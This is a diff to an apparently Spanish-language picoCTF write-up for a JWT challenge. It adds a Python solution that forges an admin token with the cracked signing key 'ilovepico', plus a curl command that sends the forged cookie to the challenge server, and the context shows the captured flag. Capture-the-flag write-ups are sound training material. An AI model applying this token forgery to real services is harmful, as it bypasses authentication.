@@ -123,7 +123,30 @@ curl -s http://jupiter.challenges.picoctf.org:63090/ -H "Cookie: jwt=eyJ0eXAiOiJ
 					<textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_f859ab2f}</textarea>
 
 ```
+### Solucion 2 python
 
+```
+import jwt
+
+clave = "ilovepico"
+
+payload = {
+        "user": "admin"
+}
+
+token = jwt.encode(payload, clave, algorithm="HS256")
+
+print(token)
+
+
+
+```
+
+
+```
+curl -s http://jupiter.challenges.picoctf.org:61864/ -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.di2J1a0H3IhZtGmIfw7ltVq7sZL2orh8WIP1isDkgdw" | grep pico
+
+```
 ## Referencias
 
 - https://jwt.io/
